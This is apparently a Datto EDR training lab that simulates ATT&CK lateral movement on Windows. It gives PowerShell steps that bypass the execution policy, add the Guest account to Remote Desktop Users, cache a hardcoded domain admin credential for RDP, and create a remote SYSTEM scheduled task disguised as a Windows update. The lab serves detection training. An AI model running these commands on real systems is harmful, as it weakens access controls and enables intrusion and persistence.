---
Title: ATT&CK - Lateral Movement Phase
Description: Simulate lateral movement techniques used by attackers within a network
Author: Chris Gerritz, Datto
Created: 04/17/2025
Achievements:
Duration: 15
Range:
- Windows
Applications:
- Terminal (Command prompt)
- PowerShell
- Datto EDR
External:
- attack.mitre.org
- allitshop.infocyte.com
---

## Description

The purpose of this lab is to simulate lateral movement techniques used by attackers to pivot between systems within a network. You will use PowerShell commands to simulate the creation of RDP connections and remote scheduled tasks on a target system. This lab emphasizes understanding how attackers move laterally and how these activities can be monitored or mitigated.

---

## Objectives
1. Understand the Lateral Movement phase of an attack.
2. Demonstrate techniques to establish remote connections and execute tasks on remote systems.
3. Evaluate the outputs and implications of lateral movement activities.

---

## Requirements

|                  |                             |
|------------------|-----------------------------|
| **Range**        | Windows                     |
| **Applications** | PowerShell                  |
| **Needed Files** | None                        |

---

## Preparation Instructions

1. Open **PowerShell** as an administrator:
   - Right-click PowerShell.
   - Select "Run as Administrator."
2. Prepare the environment by running the following:
   ```PowerShell
   # Define a random delay number (used to randomize operations)
   $n = 1000 + $(Get-Random -Max 999)
   # Bypass signed script controls
   Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
   ```

---

## Instructions

### 1. Add Guest to Remote Desktop Users Group
> *This step simulates an attacker adding a Guest user to the Remote Desktop Users group to enable remote access.*

- MITRE ATT&CK Technique: [T1021.001 - Remote Services: Remote Desktop Protocol (RDP)](https://attack.mitre.org/techniques/T1021/001)
- Copy and paste the following PowerShell commands into the terminal:
   ```PowerShell
   Write-Host -ForegroundColor Cyan "Initiating Lateral Movement - Adding Guest to Remote Desktop Users Group"
   net localgroup "Remote Desktop Users" Guest /add
   Write-Host -ForegroundColor Green "Guest successfully added to Remote Desktop Users group."
   ```

---

### 2. Establish Remote RDP Connection
> *This step simulates an attacker using stolen credentials to establish an RDP session with a target machine.*

- MITRE ATT&CK Technique: [T1021.001 - Remote Services: Remote Desktop Protocol (RDP)](https://attack.mitre.org/techniques/T1021/001)
- Copy and paste the following PowerShell commands into the terminal:

   ```PowerShell
   $cmd = @'
   cmdkey /generic:TERMSRV/CORP-DC01 /user:corp.local\adminuser /pass:P@ssw0rd123
   mstsc /v:CORP-DC01
   echo "RDP connection initiating......"
   '@
   
   $cmd += "`nStart-Sleep -Milliseconds $n"
   powershell.exe -NoProfile $cmd

   ```

---

### 3. Create a Remote Scheduled Task
> *Simulates an attacker creating a scheduled task on a remote machine to execute malicious code.*

- MITRE ATT&CK Technique: [T1053.005 - Scheduled Task: Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/005)
- Copy and paste the following PowerShell commands into the terminal:
   ```PowerShell
   Write-Host "Simulating Scheduled Task Creation on remote machine CORP-DC01..."

   & Powershell -NoProfile -NoLogo -ExecutionPolicy Bypass -command {
       cmd.exe  /c SCHTASKS  /s CORP-DC01 /RU "SYSTEM" /create /tn "WindowsUpdate0" /tr "rundll32 C:\ProgramData\good.dll,good" /sc ONCE /sd 01/01/1910 /st 00:00
   }
   ```



---
